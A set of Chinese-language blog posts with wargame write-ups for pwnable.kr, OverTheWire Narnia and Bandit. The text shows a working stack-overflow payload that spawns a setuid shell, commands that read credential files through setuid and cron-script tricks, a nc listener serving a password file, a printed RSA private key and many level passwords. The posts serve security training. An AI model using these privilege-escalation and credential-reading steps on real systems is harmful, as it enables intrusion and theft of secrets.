<h1 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h1><p>xor(value,nums)<br>与1异或nums次。</p>
<h1 id="BLACKJACK"><a href="#BLACKJACK" class="headerlink" title="BLACKJACK"></a>BLACKJACK</h1><p>把金额输成负数就可以了。</p>
<p> #include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;fcntl.h&gt;</p>
<p>unsigned char submit[6];</p>
<p>void play(){</p>
<pre><code>int i;
printf(&quot;Submit your 6 lotto bytes : &quot;);
fflush(stdout);

int r;
r = read(0, submit, 6);

printf(&quot;Lotto Start!\n&quot;);
//sleep(1);

// generate lotto numbers
int fd = open(&quot;/dev/urandom&quot;, O_RDONLY);
if(fd==-1)&#123;
    printf(&quot;error. tell admin\n&quot;);
    exit(-1);
&#125;
unsigned char lotto[6];
if(read(fd, lotto, 6) != 6)&#123;
    printf(&quot;error2. tell admin\n&quot;);
    exit(-1);
&#125;
for(i=0; i&lt;6; i++)&#123;
    lotto[i] = (lotto[i] % 45) + 1;        // 1 ~ 45
&#125;
close(fd);

// calculate lotto score
int match = 0, j = 0;
for(i=0; i&lt;6; i++)&#123;
    for(j=0; j&lt;6; j++)&#123;
        if(lotto[i] == submit[j])&#123;
            match++;
        &#125;
    &#125;
&#125;

// win!
if(match == 6)&#123;
    system(&quot;/bin/cat flag&quot;);
&#125;
else&#123;
    printf(&quot;bad luck...\n&quot;);
&#125;</code></pre><p>}</p>
<p>void help(){<br>    printf(“- nLotto Rule -\n”);<br>    printf(“nlotto is consisted with 6 random natural numbers less than 46\n”);<br>    printf(“your goal is to match lotto numbers as many as you can\n”);<br>    printf(“if you win lottery for <em>1st place</em>, you will get reward\n”);<br>    printf(“for more details, follow the link below\n”);<br>    printf(“<a target="_blank" rel="noopener" href="http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;">http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</a>);<br>    printf(“mathematical chance to win this game is known to be 1/8145060.\n”);<br>}</p>
<p>int main(int argc, char* argv[]){</p>
<pre><code>// menu
unsigned int menu;

while(1)&#123;

    printf(&quot;- Select Menu -\n&quot;);
    printf(&quot;1. Play Lotto\n&quot;);
    printf(&quot;2. Help\n&quot;);
    printf(&quot;3. Exit\n&quot;);

    scanf(&quot;%d&quot;, &amp;menu);

    switch(menu)&#123;
        case 1:
            play();
            break;
        case 2:
            help();
            break;
        case 3:
            printf(&quot;bye\n&quot;);
            return 0;
        default:
            printf(&quot;invalid menu\n&quot;);
            break;
    &#125;
&#125;
return 0;</code></pre><p>}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckemqkec00034astyeqziex8s" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-overthewire-narnia解题-一" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/" class="article-date">
  <time datetime="2020-01-14T12:05:56.000Z" itemprop="datePublished">2020-01-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/">overthewire narnia解题(一)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>账号：narnia0 密码：narnia0<br>SSH为narnia.labs.overthewire.orgas后narnia0，将目录更改为/narnia并运行ls -l。从输出中，我们可以看到我们具有的读取权限narnia0.c。我们还可以看到该资源narnia0归该narnia0组所有（通过运行我们可以看到它属于该组），并且我们对该组id拥有执行权限。此外，由于setuid位已设置（如的输出左侧所示），并且归所有者所有，因此我们可以看到它narnia0可以作为narnia1用户执行。从输出中我们可以看到是x86 ELF二进制文件。似乎很清楚，那就是它的源代码，我们需要利用sls -lnarnia1file narnia0narnia0narnia0.cnarnia0narnia0以某种方式编写程序，这样我们就可以运行任意命令narnia1。运行cat narnia0.c给出以下输出。</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()&#123;
    long val=0x41414141;
    char buf[20];

    printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);
    printf(&quot;Here is your chance: &quot;);
    scanf(&quot;%24s&quot;,&amp;buf);

    printf(&quot;buf: %s\n&quot;,buf);
    printf(&quot;val: 0x%08x\n&quot;,val);

    if(val==0xdeadbeef)
        system(&quot;/bin/sh&quot;);
    else &#123;
        printf(&quot;WAY OFF!!!!\n&quot;);
        exit(1);
    &#125;

    return 0;
&#125;</code></pre><p>从代码中可以明显看出，关卡的目的是为给出打开shell val的值。我们可以看到该程序最多读取24个字节并将其放在变量中，该变量恰好是20个字节长。由于是在之后定义的，因此，用于存储值的4个字节的内存将在为20个字节保留后直接写入。因此，如果我们提供所有24个字节，它们将溢出到存储的值的存储器中。因此，我们可以控制其价值。0xdeadbeefnarnia1stdinbufbufvalvalbufval</p>
<p>现在，为了写入有效负载，我们需要确定所用机器的字节顺序。以下程序将使我们能够做到这一点。</p>
<pre><code>const int i = 1;
#define is_bigendian() ( (*(char*)&amp;i) == 0)

#include &lt;stdio.h&gt;

int main(void) &#123;
    printf(&quot;%d\n&quot;, is_bigendian());
&#125;</code></pre><p>该is_bigendian函数将指向值1的整数指针转换为字符指针，将其取消引用并将结果与​​值0进行比较。如果系统为big-endian，则字符指针将指向最高有效位变量的字节，i为零。我们可以在的子目录中编写和编译该程序/tmp。</p>
<pre><code>narnia1@melinda:~$ mkdir /tmp/lukeaddison
narnia1@melinda:~$ cd /tmp/lukeaddison
narnia1@melinda:/tmp/lukeaddison$ nano endian.c
narnia1@melinda:/tmp/lukeaddison$ gcc endian.c -o endian
narnia1@melinda:/tmp/lukeaddison$ ./endian 
0</code></pre><p>因此，我们使用的是Little-endian机器，我们的有效负载将包含字节字符串\xef\xbe\xad\xde（的反向\xde\xad\xbe\xef）。该\x符号开始一个十六进制转义序列，使我们能够编写包含任意字节的字符串常量。我们使用python回显我们的有效负载并将其通过管道传递给narnia0。</p>
<pre><code>narnia0@melinda:/narnia$ python -c&#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0 
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
val: 0xdeadbeef
narnia0@melinda:/narnia$</code></pre><p>发生了什么？程序的输出显示该var值等于正确的值，那么为什么我们的外壳没有打开？发生的事情是外壳确实打开了，但随后立即关闭了。这是因为python命令终止时，外壳EOF程序从管道接收到了（文件末尾），并且也终止了。为了解决这个问题，我们可以使用cat来连接python进程的输出stdin。</p>
<pre><code>narnia0@melinda:/narnia$ cat &lt;(python -c&#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39;) - | ./narnia0</code></pre><p>运行上面的命令可以使我们的Shell进程保持打开状态，并且我们键入的任何内容都会通过该cat进程发送给它。因此，我们可以将命令键入为narnia1。</p>
<pre><code>whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae</code></pre><h1 id="level-0-level-1"><a href="#level-0-level-1" class="headerlink" title="level 0-level 1"></a>level 0-level 1</h1><p>账号：narnial1 密码： efeideae<br>Linux export 命令用于设置或显示环境变量。<br>只要到网上找到一个可用的shellcode传入EGG变量就行了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/" data-id="ckemqkebc001wastydfz6dm8a" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-overthewire解题（二）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date">
  <time datetime="2020-01-13T02:52:31.000Z" itemprop="datePublished">2020-01-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/">overthewire解题（二）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h1><p>用账号：bandit13，密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL进入本关</p>
<pre><code>    bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
    Could not create directory &#39;/home/bandit13/.ssh&#39;.
    The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
    ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
    Are you sure you want to continue connecting (yes/no)? yes
    Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).
    This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

    Linux bandit 4.18.12 x86_64 GNU/Linux

      ,----..            ,----,          .---. 
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .&#39;  :     .--&#39;.  &#39; ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .&#39;___,/    ,&#39; .--&#39;.  &#39;   \&#39; .
  ;   |  ; \ ; | |    :     | /___/ \ |    &#39; &#39; 
  |   :  | ; | &#39; ;    |.&#39;;  ; ;   \  \;      : 
  .   |  &#39; &#39; &#39; : `----&#39;  |  |  \   ;  `      |
  &#39;   ;  \; /  |     &#39;   :  ;   .   \    .\  ; 
   \   \  &#39;,  /      |   |  &#39;    \   \   &#39; \ |
    ;   :    /       &#39;   :  |     :   &#39;  |--&quot;  
     \   \ .&#39;        ;   |.&#39;       \   \ ;     
  www. `---` ver     &#39;---&#39; he       &#39;---&quot; ire.org     


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames. 
  If you are playing &quot;somegame&quot;, then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command &quot;mktemp -d&quot; in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with 
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don&#39;t leave orphan processes running
    * don&#39;t leave exploit-files laying around
    * don&#39;t annoy other players
    * don&#39;t post passwords or spoilers
    * again, DONT POST SPOILERS! 
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro 

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</code></pre><p> 密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><p>用账号：bandit14，密码：4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e进入本关</p>
<pre><code>bandit14@bandit:~$ nc localhost 30000

Wrong! Please enter the correct current password
bandit14@bandit:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr</code></pre><p>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>BfMYroe26WYalil77FoDi9qh59eK5xNr</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><p>用账号：bandit15，密码：BfMYroe26WYalil77FoDi9qh59eK5xNr进入本关</p>
<pre><code>bandit15@bandit:~$ openssl s_client -connect localhost:30001 -quite
s_client: Option unknown option -quite
s_client: Use -help for summary.
bandit15@bandit:~$ openssl s_client -connect localhost:30001 -quiet
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd</code></pre><p>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>cluFn7wTiGryunymYOu4RcffSxQluehd</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>用账号：bandit16，密码：cluFn7wTiGryunymYOu4RcffSxQluehd进入本关</p>
<pre><code>bandit16@bandit:~$ nmap -sV -A -p 31000-32000 localhost | grep open
31046/tcp open  echo
31518/tcp open  ssl/echo
31691/tcp open  echo
31790/tcp open  ssl/unknown
31960/tcp open  echo
bandit16@bandit:~$ openssl s_client -connect localhost:31790 -quiet
depth=0 CN = bandit
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = bandit
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
bandit16@bandit:~$ mkdir /tmp/rtm2
bandit16@bandit:~$ nano /tmp/rtm2/sshkey

[PASTE CONTENTS OF PRIVATE KEY INTO EMPTY FILE]

bandit16@bandit:~$ chmod 600 /tmp/rtm2/sshkey
bandit16@bandit:~$ ssh -i /tmp/rtm2/sshkey bandit17@localhost</code></pre><p>我们首先对运行在31000和32000之间的开放端口上的服务执行Nmap扫描。为了整洁，输出通过grep传递。</p>
<p>我们发现五个端口报告为打开，其中三个报告其服务为回声。不是我们感兴趣的内容。我们还发现有两个ssl服务正在侦听，但是其中一个也在运行echo。</p>
<p>我们尝试与端口31790建立连接，输入先前的密码，然后返回并返回似乎是bandit17的ssh私钥！</p>
<p>在使用它访问bandit17之前，我们首先需要在/ tmp中创建一个新目录。使用nano（或您喜欢的文本编辑器）在其中创建一个新的文本文件，并将ssh私钥的内容粘贴到空文件中。</p>
<p>如果从现在开始尝试使用刚才创建的ssh密钥文件登录bandit17，将会遇到错误。在没有首先使用’chmod’锁定ssh密钥文件的权限的情况下，我们将返回“ Unprotected Private Key File！”警告。将权限修改为600将解决此问题。</p>
<h1 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h1><p>bandit17@bandit:~$ diff passwords.old passwords.new<br>42c42<br>&lt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA</p>
<hr>
<pre><code>&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
bandit17@bandit:~$ </code></pre><h1 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h1><p>用账号：bandit18，密码：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd进入本关</p>
<p>描述：下一级别的密码存储在家庭目录中的文件自述文件中。不幸的是， 当你使用SSH登录时，有人修改了.bashrc将你注销。</p>
<p>过程：</p>
<pre><code>  Enjoy your stay!
  Byebye !
  Connection closing...Socket close.

      bandit17@bandit:~$ ssh bandit18@localhost cat readme
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit17/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0640 for &#39;/home/bandit17/.ssh/id_rsa&#39; are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key &quot;/home/bandit17/.ssh/id_rsa&quot;: bad permissions
bandit18@localhost&#39;s password: 
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</code></pre><h1 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h1><p>用账号：bandit19，密码：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x进入本关</p>
<pre><code>bandit19@bandit:~$ ls     
bandit20-do
bandit19@bandit:~$ ls -l bandit20-do 
-rwsr-x--- 1 bandit20 bandit19 7408 Dec 28 14:34 bandit20-do
bandit19@bandit:~$ ./bandit20-do 
Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do whoami
bandit20
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j        </code></pre><p>一步一步就知道这个文件的作用以及用法</p>
<p>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>GbKksEFF4yrVs6il55v6gwY5aVje5f0j</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h1><p>用账号：bandit20，密码：GbKksEFF4yrVs6il55v6gwY5aVje5f0j进入本关</p>
<p>描述：homedirectory中有一个setuid二进制文件，它执行以下操作：它在您指定为命令行参数的端口上连接到localhost。然后它从连接中读取一行文本，并将其与前一级别的密码（bandit20）进行比较。如果密码正确，它将传输下一级密码（bandit21）。</p>
<p>注意：尝试连接到您自己的网络守护程序，以查看它是否按照您的想法工作，这个程序会访问 localhost 的[你提供的端口号]来获取数据。这里我们需要处理两件事情：1.运行这个程序。2.创建一个监听事件并会回复这个程序当前关的密码。</p>
<p>过程：</p>
<p>首先使用nc 监听一个端口，并推送/etc/bandit_pass/bandit20文件内容，即bandit20的密码</p>
<pre><code>bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ ./suconnect 
Usage: ./suconnect &lt;portnumber&gt;
This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20</code></pre><p>此时2333端口处于监听状态，再建立一个ssh连接</p>
<pre><code>bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ ./suconnect 2333
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password</code></pre><p>成功读取到文件以后，就把下一关的密码发送到监听端口</p>
<pre><code>bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ ./suconnect 
Usage: ./suconnect &lt;portnumber&gt;
This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</code></pre><p>成功获得密码 。</p>
<p>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-21"><a href="#level-21" class="headerlink" title="level 21"></a>level 21</h1><p>用账号：bandit21，密码：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr进入本关</p>
<p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。</p>
<p>过程：</p>
<pre><code>bandit21@bandit:~$ cd /etc/cron.d/
bandit21@bandit:/etc/cron.d$ ls -al
total 28
drwxr-xr-x   2 root root 4096 Dec 28 14:34 .
drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22
-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24
-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</code></pre><p>cron指Linux系统下一个自动执行指定任务的程序（计划任务），” bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null” 中的”“表示每分钟执行一次这个脚本，再用cat查询该脚本的内容，不停把/etc/bandit_pass/bandit22文件内容（即下一关的密码）写入/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv，并且更改了权限。</p>
<p>密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</p>
<h1 id="level-22"><a href="#level-22" class="headerlink" title="level 22"></a>level 22</h1><p>用账号：bandit22，密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI进入本关</p>
<p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。</p>
<p>注意：查看其他人编写的shell脚本是非常有用的技巧。这个级别的脚本有意使其易于阅读。如果您在理解它的功能时遇到问题，请尝试执行它以查看它打印的调试信息。</p>
<p>过程：</p>
<pre><code>bandit22@bandit:~$ cd /etc/cron.d
bandit22@bandit:/etc/cron.d$ ls -al
total 28
drwxr-xr-x   2 root root 4096 Dec 28 14:34 .
drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22
-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24
-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest
bandit22@bandit:/etc/cron.d$ cat -n cronjob_bandit23
     1    @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
     2    * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh 

# !/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d &#39; &#39; -f 1)

echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;

cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d &#39; &#39; -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</code></pre><p>直接赋值执行。</p>
<p>密码：</p>
<blockquote>
<p>jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</p>
</blockquote>
<h1 id="level-23"><a href="#level-23" class="headerlink" title="level 23"></a>level 23</h1><p>用账号：bandit23，密码：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n进入本关</p>
<p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。</p>
<p>注意：此级别要求您创建自己的第一个shell脚本。这是非常大的一步，当你击败这个级别时，你应该为自己感到自豪！</p>
<p>注2：请记住，你的shell脚本一旦被执行就被删除，所以你可能想保留一份副本……</p>
<p>过程：</p>
<pre><code>bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;
for i in * .*;
do
    if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ];
    then
    echo &quot;Handling $i&quot;
    timeout -s 9 60 ./$i
    rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ mkdir /tmp/crayon   
bandit23@bandit:/etc/cron.d$ cd /tmp/crayon
bandit23@bandit:/tmp/crayon$ vim bandit24.sh
bandit23@bandit:/tmp/crayon$ cat bandit24.sh 
#!/bin/bash
cat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/crayon/level24
